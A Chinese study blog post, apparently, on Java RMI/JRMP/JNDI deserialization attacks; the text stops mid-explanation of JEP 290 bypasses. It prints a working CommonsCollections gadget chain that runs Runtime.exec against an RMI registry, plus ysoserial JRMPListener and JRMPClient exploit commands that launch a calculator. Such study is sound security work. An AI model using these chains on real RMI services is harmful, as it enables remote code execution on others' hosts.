# Java反序列化学习之RMI/JRMP/JNDI

## 前言
花时间好好学习RMI/JRMP/JNDI的区别，这三个是近两年Java反序列化经常出现的概念，涉及到的知识点也比较多，需要花时间琢磨一番。由于知识点太多，对于自己学习总结的话，主要是记录关键内容。

## 基本概念

**RMI**

RMI是java中的远程方法调用，指的是操作行为。通常是指调用jvm之外的API方法

**JRMP**

JRMP是Java远程方法协议，在RMI的过程中，通过JRMP协议进行数据传输调用。该协议用于Java RMI过程中

**JNDI**

JNDI是java中的接口方法，通过接口实现目录系统。同时根据名称可实现对相关对象方法的查询，并下载查询到的对象方法。

## 反序列化攻击应用

### Java RMI反序列化

在执行Java RMI时，传输的数据包含有序列化数据。并且无论是在JRMP的客户端还是服务端接收到JRMP协议数据时，都会将序列化的数据进行反序列化。所以在这个过程中，针对开启了RMI服务的主机，可对其发送序列化代码造成反序列化攻击。

Server注册对象：

1. Server向Registry注册远程对象，远程对象绑定在一个//host:port/objectname上，形成映射表（Service-Stub）

Client调用：

1. Client向Registry通过RMI地址查询对应的远程引用（Stub）。这个远程引用包含了一个服务器主机名和端口号
1. Client拿着Registry给它的远程引用，照着上面的服务器主机名、端口去连接提供服务的远程RMI服务器
1. Client传送给Server需要调用函数的输入参数，Server执行远程方法，并返回给Client执行结果


![2.png](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/java_ser/2.png)


**反序列化攻击**

攻击场景分为三种：

1. 服务端攻击注册中心
1. 注册中心攻击客户端
1. 客户端攻击注册中心

作为渗透攻击来说，见得比较多的还是第三种情况。网络中发现RMI注册中心，对注册中心发起反序列化攻击。对于其他两种攻击场景，借用别人的复现简单描述一下。

1）服务端攻击注册中心

服务端也是向注册中心序列化传输远程对象,使用ysoserial工具中的RMIRegistryExploit代码，构造反序列化Gadget发送给注册中心。可使用ysoserial payload模块中的Gadget

	public class HelloServer {
	    public static void main(String[] args) throws Exception {
	        try {
	​
	            Transformer[] transformers = new Transformer[]{
	                    new ConstantTransformer(Runtime.class),
	                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
	                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
	                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open /Applications/Calculator.app"}),
	            };
	            Transformer transformer = new ChainedTransformer(transformers);
	            Map innerMap = new HashMap();
	            Map ouputMap = LazyMap.decorate(innerMap, transformer);
	​
	            TiedMapEntry tiedMapEntry = new TiedMapEntry(ouputMap, "pwn");
	            BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
	​
	            Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
	            field.setAccessible(true);
	            field.set(badAttributeValueExpException, tiedMapEntry);
	​
	            Map tmpMap = new HashMap();
	            tmpMap.put("pwn", badAttributeValueExpException);
	            Constructor<?> ctor = null;
	            ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
	            ctor.setAccessible(true);
	            InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override.class, tmpMap);
	            Remote remote = Remote.class.cast(Proxy.newProxyInstance(HelloServer.class.getClassLoader(), new Class[]{Remote.class}, invocationHandler));
	            Registry registry = LocateRegistry.getRegistry(1099);
	            registry.bind("hello1", remote);
	        } catch (Exception e) {
	            e.printStackTrace();
	        }
	    }
	}



2）注册中心攻击客户端

通过ysoserial启动JRMP服务端，指定payload和命令

    java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 "calc.exe"

然后启动RMI客户端的代码进行查询,会发现计算器直接被弹出

![1.png](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/java_ser/1.png)

3）客户端攻击注册中心


通过ysoserial启动JRMPClient攻击注册中心，并指定攻击payload和执行的命令

>     java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPClient 192.168.xxx.xxx 1099 CommonsCollections5 "calc.exe"

执行完命令后计算器直接弹出来了,原因是RMI框架采用DGC(Distributed Garbage Collection)分布式垃圾收集机制来管理远程对象的生命周期,可以通过与DGC通信的方式发送恶意payload让注册中心反序列化。


**JEP 290**

为了化解不安全的反序列化所带来的风险，Oracle对Java内核进行了相应的修改。其中最重要的一些修改是在JavaEnhancement Process（JEP）文档290（简称JEP 290）中所介绍的。JEP是JDK9的一部分，但已被反向移植到了较旧的Java版本中，其中包括：

-   Java™ SE Development Kit 8, Update 121 (JDK 8u121)
-   Java™ SE Development Kit 7, Update 131 (JDK 7u131)
-   Java™ SE Development Kit 6, Update 141 (JDK 6u141)

JEP290只是为RMI注册表和RMI分布式垃圾收集器提供了相应的内置过滤器,在RMI客户端和服务端在通信时参数传递这块是没有做处理的,而参数传递也是基于序列化数据传输,那么如果参数是泛型的payload,传输依然会有问题。

先把接口都新增一个sayPayload的方法,参数都是Object类型的

